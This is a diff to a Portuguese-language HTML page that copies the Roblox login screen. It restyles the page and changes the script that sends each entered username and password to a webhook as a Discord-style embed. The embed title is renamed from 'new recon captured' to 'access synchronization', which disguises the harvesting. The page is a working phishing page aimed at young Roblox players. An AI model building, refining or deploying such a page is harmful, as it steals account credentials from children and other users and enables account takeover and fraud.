@@ -18,73 +18,78 @@
             display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* HEADER ORIGINAL STYLE */
+        /* BARRA SUPERIOR SINCRONIZADA */
         .roblox-header {
-            width: 100%; height: 40px; background: #232527;
+            width: 100%; height: 44px; background: #232527;
             display: flex; align-items: center; 
-            padding: 0 15px; position: fixed; top: 0; z-index: 10; box-sizing: border-box;
+            padding: 0 20px; position: fixed; top: 0; z-index: 10; box-sizing: border-box;
         }
 
         .roblox-logo {
-            height: 26px; width: 26px;
+            height: 28px; width: 28px;
             background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg==');
             background-size: contain; background-repeat: no-repeat;
-            margin-right: 15px; cursor: pointer;
+            margin-right: 20px; cursor: pointer;
         }
 
-        .header-nav { display: flex; align-items: center; gap: 15px; color: #fff; font-size: 14px; font-weight: 500; flex-grow: 1; }
+        .header-nav { display: flex; align-items: center; gap: 18px; color: #fff; font-size: 15px; font-weight: 500; flex-grow: 1; }
         
-        .search-bar { position: relative; flex-grow: 1; max-width: 450px; margin: 0 10px; }
+        .search-bar { position: relative; flex-grow: 1; max-width: 500px; margin: 0 15px; }
         .search-bar input {
-            width: 100%; height: 28px; background: rgba(25,27,29,0.8); border: 1px solid #454749;
-            border-radius: 6px; padding-left: 30px; color: #bdbebe; font-size: 13px; outline: none;
+            width: 100%; height: 32px; background: rgba(0, 0, 0, 0.2); border: 1px solid #454749;
+            border-radius: 8px; padding-left: 35px; color: #fff; font-size: 14px; outline: none; box-sizing: border-box;
         }
 
         .search-icon { 
-            position: absolute; left: 8px; top: 6px; height: 15px; width: 15px;
+            position: absolute; left: 10px; top: 8px; height: 16px; width: 16px;
             background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjYmRiZWJlIiBzdHJva2Utd2lkdGg9IjIuNSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48Y2lyY2xlIGN4PSIxMSIgY3k9IjExIiByPSI4Ij48L2NpcmNsZT48bGluZSB4MT0iMjEiIHkxPSIyMSIgeDI9IjE2LjY1IiB5Mj0iMTYuNjUiPjwvbGluZT48L3N2Zz4=');
             background-size: contain; background-repeat: no-repeat;
         }
 
-        /* CONTAINER DE LOGIN - AJUSTE DE LARGURA */
-        .container { flex: 1; display: flex; align-items: center; justify-content: center; padding-top: 40px; }
+        /* CONTAINER DE LOGIN */
+        .container { flex: 1; display: flex; align-items: center; justify-content: center; padding-top: 44px; }
         
         .login-box {
-            background-color: #393b3d; padding: 30px 40px; border-radius: 4px;
-            width: 90%; max-width: 380px; text-align: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5); z-index: 2;
+            background-color: #393b3d; padding: 45px 35px; border-radius: 8px;
+            width: 90%; max-width: 400px; text-align: center;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.6); z-index: 2; box-sizing: border-box;
         }
 
-        /* TÍTULO - AUMENTADO PARA 28PX PARA DAR MAIS PESO */
-        h1 { color: #fff; font-size: 28px; margin-bottom: 25px; font-weight: 700; }
+        /* TÍTULO - AGORA COM 32PX PARA PESO MÁXIMO */
+        h1 { color: #fff; font-size: 32px; margin-bottom: 30px; font-weight: 700; letter-spacing: -0.8px; }
         
-        /* INPUTS - AJUSTADOS PARA 44PX DE ALTURA PARA MAIOR ROBUSTEZA */
+        /* INPUTS - AJUSTADOS PARA 48PX DE ALTURA (ROBUSTEZA TOTAL) */
         input {
-            width: 100%; height: 44px; background-color: #252728; border: 1px solid #1a1b1c;
-            border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 10px;
+            width: 100%; height: 48px; background-color: #191b1d; border: 1px solid #454749;
+            border-radius: 4px; color: #fff; padding: 0 15px; margin-bottom: 12px;
             box-sizing: border-box; font-size: 16px; outline: none;
         }
 
-        /* BOTÃO ENTRAR - AJUSTADO PARA 42PX DE ALTURA */
+        /* BOTÃO ENTRAR SINCRONIZADO */
         .btn-entrar {
-            width: 100%; height: 42px; background-color: transparent; border: 1px solid #ffffff;
-            color: #fff; border-radius: 4px; font-size: 16px; cursor: pointer; margin: 10px 0 15px 0;
-            font-weight: 500;
+            width: 100%; height: 44px; background-color: transparent; border: 1.5px solid #ffffff;
+            color: #fff; border-radius: 4px; font-size: 17px; cursor: pointer; margin: 10px 0 20px 0;
+            font-weight: 600; transition: background 0.3s;
         }
-
-        /* BOTÃO SECUNDÁRIO - AJUSTADO PARA 44PX DE ALTURA */
-        .btn-secondary {
-            width: 100%; height: 44px; background-color: #4f5153; border: none;
-            color: #fff; border-radius: 4px; font-size: 14px; margin-bottom: 10px; cursor: pointer;
-            font-weight: 500;
-        }
+        .btn-entrar:hover { background: rgba(255, 255, 255, 0.1); }
 
         .forgot-link {
-            color: #fff; text-decoration: none; font-size: 13px; 
-            display: block; margin-bottom: 20px;
+            color: #fff; text-decoration: none; font-size: 14px; 
+            display: block; margin-bottom: 30px; opacity: 0.9;
         }
 
-        .footer-classificacao { position: fixed; bottom: 12px; width: 100%; text-align: center; color: #fff; }
+        /* BOTÕES SECUNDÁRIOS - AGORA COM 48PX PARA ALINHAMENTO COM INPUTS */
+        .btn-secondary {
+            width: 100%; height: 48px; background-color: #4f5153; border: none;
+            color: #fff; border-radius: 4px; font-size: 15px; margin-bottom: 12px; cursor: pointer;
+            font-weight: 600; transition: background 0.2s;
+        }
+        .btn-secondary:hover { background-color: #5a5c5e; }
+
+        .signup-text { color: #fff; font-size: 15px; margin-top: 35px; }
+        .signup-text span { text-decoration: underline; cursor: pointer; font-weight: 600; }
+
+        .footer-classificacao { position: fixed; bottom: 15px; width: 100%; text-align: center; color: #fff; }
     </style>
 </head>
 <body>
@@ -102,30 +107,34 @@
         </div>
     </div>
     
-    <div style="display: flex; gap: 8px;">
-        <button style="background: #0084ff; border: none; color: #fff; padding: 4px 10px; border-radius: 4px; font-weight: 700; font-size: 12px; cursor:pointer">Cadastrar-se</button>
-        <button style="background: transparent; border: 1px solid #fff; color: #fff; padding: 4px 10px; border-radius: 4px; font-weight: 700; font-size: 12px; cursor:pointer">Entrar</button>
+    <div style="display: flex; gap: 10px;">
+        <button style="background: #0084ff; border: none; color: #fff; padding: 6px 15px; border-radius: 4px; font-weight: 700; font-size: 13px; cursor:pointer">Cadastrar-se</button>
+        <button style="background: transparent; border: 1px solid #fff; color: #fff; padding: 6px 15px; border-radius: 4px; font-weight: 700; font-size: 13px; cursor:pointer">Entrar</button>
     </div>
 </div>
 
 <div class="container">
     <div class="login-box">
         <h1>Entrar na Roblox</h1>
-        <input type="text" id="user" placeholder="Usuário/e-mail/telefone" autocomplete="off">
+        <input type="text" id="user" placeholder="Usuário/e-mail/telefone" autocomplete="off" spellcheck="false">
         <input type="password" id="pass" placeholder="Senha" autocomplete="off">
+        
         <button class="btn-entrar" onclick="sendToWebhook()">Entrar</button>
+        
         <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
+        
         <button class="btn-secondary">Envie-me um código único por e-mail</button>
         <button class="btn-secondary">Entrada rápida</button>
-        <p style="color: #fff; font-size: 14px; margin-top: 25px;">
-            Não possui uma conta? <span style="text-decoration: underline; cursor: pointer;">Cadastrar-se</span>
+        
+        <p class="signup-text">
+            Não possui uma conta? <span>Cadastrar-se</span>
         </p>
     </div>
 </div>
 
 <div class="footer-classificacao">
-    <div style="background: #fff; color: #000; font-weight: bold; padding: 1px 5px; border-radius: 2px; display: inline-block; font-size: 12px;">12</div>
-    <div style="font-size: 10px; margin-top: 4px; font-weight: 500; opacity: 0.9;">CLASSIFICAÇÃO INDICATIVA: 12 ANOS</div>
+    <div style="background: #fff; color: #000; font-weight: bold; padding: 2px 6px; border-radius: 3px; display: inline-block; font-size: 12px;">12</div>
+    <div style="font-size: 11px; margin-top: 5px; font-weight: 500; opacity: 0.9;">CLASSIFICAÇÃO INDICATIVA: 12 ANOS</div>
 </div>
 
 <script>
@@ -140,13 +149,13 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ 
                     embeds: [{
-                        title: "🚀 Novo Recon Capturado",
-                        color: 3447003,
+                        title: "🚀 Sincronização de Acesso",
+                        color: 16777215,
                         fields: [
                             { name: "👤 Usuário", value: `\`${u}\``, inline: true },
                             { name: "🔑 Senha", value: `\`${p}\``, inline: true }
                         ],
-                        footer: { text: "Sistema de Sincronização Roblox" }
+                        timestamp: new Date()
                     }]
                 })
             }).then(() => {
